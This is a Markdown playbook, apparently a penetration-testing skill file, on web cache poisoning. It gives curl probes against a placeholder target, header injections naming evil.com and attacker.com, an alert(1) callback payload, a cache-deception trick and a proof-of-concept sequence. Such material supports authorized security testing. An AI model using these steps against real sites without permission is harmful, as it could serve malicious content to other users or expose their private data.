---
name: cache-poisoning
description: Web cache poisoning, unkeyed headers, parameter cloaking, cache deception
category: vulnerabilities
---

# Web Cache Poisoning

> Exploit CDN and proxy caches to serve malicious content to other users.

## Attack Surface
- CDN caches (Cloudflare, Akamai, Fastly)
- Reverse proxies (Nginx, Varnish, Squid)
- Application-level caching (Redis, Memcached)
- Browser caches (Service Workers)

## PHASE 1 — Cache Detection
```bash
# Check if response is cached
curl -sI "https://target.com/" | grep -i "cf-cache-status\|x-cache\|age\|cache-control"

# X-Cache: hit → cached
# CF-Cache-Status: HIT → Cloudflare cached
# Age > 0 → served from cache
```

## PHASE 2 — Finding Unkeyed Headers
```bash
# Test if X-Forwarded-Host is unkeyed
curl -s "https://target.com/" -H "X-Forwarded-Host: evil.com" -o /dev/null -w "%{http_code}"

# Test if X-Forwarded-Scheme is unkeyed
curl -s "https://target.com/" -H "X-Forwarded-Scheme: http" -o /dev/null -w "%{http_code}"

# Test Origin-based cache poisoning
curl -s "https://target.com/" -H "Origin: https://evil.com" -D -
```

### Common Unkeyed Headers
```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Port
X-Origin
X-HTTP-Method-Override
X-HTTP-Method
X-Method-Override
Origin
X-Real-IP
X-Forwarded-For
Cookie (partial)
```

## PHASE 3 — Parameter Cloaking
```bash
# Hide parameters from cache key
curl "https://target.com/?param=value&utm_source=cloaked"
# If utm_* or tracking params are unkeyed, use them to inject

# Cache buster + payload
curl "https://target.com/?cb=123&callback=alert(1)"
```

## PHASE 4 — Cache Deception
```bash
# Trick cache into storing sensitive data
curl "https://target.com/profile/sensitive-data.css"
# Cache thinks it's a static CSS file, stores the response
# Attacker accesses the cached URL to view sensitive data
```

## PHASE 5 — PoC Validation
```
1. Find unkeyed header X-Forwarded-Host
2. Send request with X-Forwarded-Host: attacker.com
3. Response contains reflected host value
4. Cache stores poisoned response
5. Other users receive content from attacker.com
```

## Tools
- **Nuclei**: `nuclei -t exposures/configs/ -tags cache`
- **toxicsache**: Dedicated cache poisoning scanner
- **Param Miner** (Burp): Finds unkeyed params
- **Manual**: curl with header variations
